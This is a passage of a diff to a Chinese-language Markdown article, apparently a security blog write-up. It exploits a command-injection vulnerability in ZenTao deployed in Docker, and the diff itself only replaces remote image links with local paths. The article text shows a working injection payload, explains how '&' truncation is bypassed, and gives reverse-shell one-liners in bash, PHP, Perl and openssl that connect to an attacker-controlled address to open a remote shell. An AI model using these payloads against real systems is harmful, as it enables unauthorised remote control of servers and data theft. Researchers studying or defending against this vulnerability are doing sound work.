@@ -78,27 +78,27 @@ schema_version: "1"
 
 执行完上面 3 条命令后，浏览器直接访问 http:// 宿主机 ip: 宿主机映射端口，一直点下一步即可完成配置。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibNrP37lic7SugadXtRv3akxDHB4picBeyFtS2opNCrYYCd7iaO3dVbYqN5YickCjXXE7jCGULibYaIia6LA/640?wx_fmt=png)
+![](../../.resource/remote/b44507b8840ab6749f80b2b1ac900192e8f001d33a40fcec191aec8871f554f3.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibNrP37lic7SugadXtRv3akxD5XAF3x2bYckyCbZaFjLy0Dy4Z98LRLRhjdO0fgv7S7qjZWqOXRxOaQ/640?wx_fmt=png)
+![](../../.resource/remote/e5a7474df0d937d8787f32a562df3e3b339b3329d720215d9c864f3089077610.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibNrP37lic7SugadXtRv3akxDZ4OsxWEmZGCu4BFdYWSFmmqm3ypl3M6xvUVm4pqkWENtncxV9iajJHw/640?wx_fmt=png)
+![](../../.resource/remote/d8d6f95dfd039c49e22efbbdb80890cdbe6eb841b79f3a6eb3c50ab0ec2ea293.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibNrP37lic7SugadXtRv3akxD5ib8iaAysgQibqzvseWyGqcc1VfITRpXSBlUFEB4ws3XvCuNoy7JXArJw/640?wx_fmt=png)
+![](../../.resource/remote/56b3e9f7366fbb688e16044367ac45185e47e58b8a39221b5dc648966f9d080a.png)
 
 **0x03 漏洞利用**
 
 payload：SCM=Subversion&client=`id`
 
-![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibNrP37lic7SugadXtRv3akxDJ3M9oLCjsV4jt7B3pNRLmic8RM4VicMKnibf0icxYsrSlpWI7oxxaCYMPg/640?wx_fmt=png)
+![](../../.resource/remote/de94c978aecef5015e3e71ec3352ec58e09d7f503f9c1702e51b8531650400ce.png)
 
 在实战中，只是执行 id 命令还是不够的，下面尝试一下反弹 shell，在实战过程中，发现常规的反弹 shell 命令执行不成功，经过测试后发现，在此处命令执行的时候，如果 payload 中带有 & 符号，则 payload 会被截断。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibNrP37lic7SugadXtRv3akxDP1jqLnoRL8SAGocGPjozzelxaqHTSVvWE4VCLPeaTvJbUkEKOaUJicg/640?wx_fmt=png)
+![](../../.resource/remote/99f325a4636c34ae3fbd6bc83c82d472b7d3543703d54d70c3efbeaa5a02e1a4.png)
 
 所以，当我们使用类似 “bash -i>& /dev/tcp/xx.xx.xx.xx/9999 0>&1” 的 payload 时，服务端只会执行 “bash -i >” 命令，无法完整执行反弹 shell 的命令。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibNrP37lic7SugadXtRv3akxD2JE3CqRAJiatNUqblTiayBRN8PTkGHib0hmD2LQUDF1DV3TFBQDibibue4Q/640?wx_fmt=png)
+![](../../.resource/remote/483be2d5c23b08a8ea5b75042b5019ed359e8a1a8e273a461954a9c10d8d6542.png)
 
 想要成功反弹 shell，payload 中必须不能有 & 符号。这时候可以考虑用远端加载 payload 到本地的方式执行。
 
@@ -108,19 +108,19 @@ payload：SCM=Subversion&client=`id`
 
 虽然服务端报错，但是命令成功执行。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibNrP37lic7SugadXtRv3akxDJPibV6PrwlqpViaz5C3cUVaWP4mJg37MbYMkmBqHicw3vxMHLHghEwKdA/640?wx_fmt=png)
+![](../../.resource/remote/c182cde00f83b45b27057cac7a44cea7cc4fa4df8619e3d92aca1a3d75b51a1b.png)
 
 禅道是 php 开发的，所以 php 脚本也可以：
 
 <table><tbody><tr><td width="557" valign="top"><p>payload：php -r '$sock=fsockopen("xx.xx.xx.xx",xx);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</p></td></tr></tbody></table>
 
-![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibNrP37lic7SugadXtRv3akxDpG6IQrIVOyJLhGgrp09iaqD9FT5bCBvIzibXyV3muNgfhFwn9PdR1rgQ/640?wx_fmt=png)
+![](../../.resource/remote/c7a2126da3c51a552c73f8f9dc96b07b62afc266fcf67df4358cf0c4e94cea70.png)
 
 测试发现 docker 里还有 perl 环境，所以 perl 脚本也可以：
 
 <table><tbody><tr><td width="557" valign="top"><p>payload：perl -e 'use Socket;$i="xx.xx.xx.xx";$p=xxxx;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</p></td></tr></tbody></table>
 
-![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibNrP37lic7SugadXtRv3akxDZ1Pxr1MWq9GjNMaex7VAdK99YOYicjQS1TKFAGUg5NZ6ZibsyMFMyN6w/640?wx_fmt=png)
+![](../../.resource/remote/264847adfd59ab03595eee091a55c313a7fcf001047e97bef8b9ceaf24eec479.png)
 
 在 docker 中还支持 openssl，所以还可以使用 openssl 反弹加密的 shell。  
 
@@ -136,7 +136,7 @@ payload：SCM=Subversion&client=`id`
 
 <table><tbody><tr><td width="557" valign="top"><p>mkfifo /tmp/s; /bin/sh -i &lt;/tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect xx.xx.xx.xx:9999 &gt; /tmp/s; rm /tmp/s</p></td></tr></tbody></table>
 
-![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibNrP37lic7SugadXtRv3akxDubFe2LyD6RgJ9mdibpxTkhhsedXkCK5gBscIYoOgvpT4gtiaBoDFYzAQ/640?wx_fmt=png)
+![](../../.resource/remote/b9225579bc4a8c09bc41ca30fa6c56eedeb894ca76f6db562d6b9a809616ed83.png)
 
 Over~
 
